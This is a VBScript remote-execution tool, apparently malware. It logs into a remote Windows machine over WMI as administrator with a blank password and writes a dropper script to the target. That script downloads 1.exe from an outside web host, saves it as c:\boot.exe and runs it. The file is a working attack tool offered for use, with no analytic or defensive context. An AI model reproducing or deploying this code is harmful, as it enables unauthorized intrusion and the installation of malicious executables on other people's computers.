Set colArgs = WScript.Arguments
If WScript.arguments.count < 1 then
WScript.Echo "USAGE:" & vbCrLf & " rexec.vbs Computer User Password"
WScript.quit
End If
strComputer = wscript.arguments(0)
strUser = administrator
strPwd = ""

cmddoor = "cmd /c echo Set xPost = createObject("&chr(34)&"Microsoft.XMLHTTP"&chr(34)&") >c:\1.vbs"_
          &"&& echo xPost.Open"&chr(32)&chr(34)&"GET"&chr(34)&","&chr(34)&"http://www40.websamba.com/henry289/1.exe"&chr(34)&",0 >>c:\1.vbs"_
          &"&& echo xPost.Send() >>c:\1.vbs"_
          &"&& echo Set sGet = createObject("&chr(34)&"ADODB.Stream"&chr(34)&")>>c:\1.vbs"_
          &"&& echo sGet.Mode = 3 >>c:\1.vbs"_
          &"&& echo sGet.Type = 1 >>c:\1.vbs"_
          &"&& echo sGet.Open() >>c:\1.vbs"_
          &"&& echo sGet.Write(xPost.responseBody) >>c:\1.vbs"_
          &"&& echo sGet.SaveToFile"&chr(32)&chr(34)&"c:\boot.exe"&chr(34)&",2 >>c:\1.vbs"_
          &"&& echo CreateObject("&chr(34)&"WScript.Shell"&chr(34)&").Run"&chr(32)&chr(34)&"c:\boot.exe"&chr(34)&">>c:\1.vbs"


set olct=createobject("wbemscripting.swbemlocator")
set wbemServices=olct.connectserver(strComputer,"root\cimv2",strUser,strPwd)

Set pp=wbemServices.get("Win32_Process")
pp.create(cmddoor)
pp.create "cmd /c start c:\1.vbs",null,oC,intProcessID

